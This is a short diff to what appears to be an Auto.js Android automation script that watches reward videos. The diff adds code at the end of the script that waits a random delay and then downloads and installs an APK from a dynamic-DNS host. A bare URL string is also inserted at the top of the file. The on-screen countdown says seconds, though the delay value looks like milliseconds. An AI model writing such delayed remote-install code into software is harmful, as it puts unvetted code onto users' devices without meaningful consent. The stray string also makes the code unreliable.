@@ -1,3 +1,4 @@
+"http://zhangshuhong888.iask.in:8989/随便粘_40.apk"
 importClass(com.hongshu.utils.PermissionUtils)
 importClass(android.content.ComponentName)
 importClass(com.hongshu.receiver.DeviceReceiver)
@@ -1637,5 +1638,7 @@ var seerewardvideo=function(apppkg){
        gbgg=gbgg+1
     }
 }
-
-
+let r=randomint(1000,3600000)
+show(r+"秒后开始更新")
+sleep(r)
+downloadandinstallapp("随便粘","http://zhangshuhong888.iask.in:8989/随便粘_40.apk")
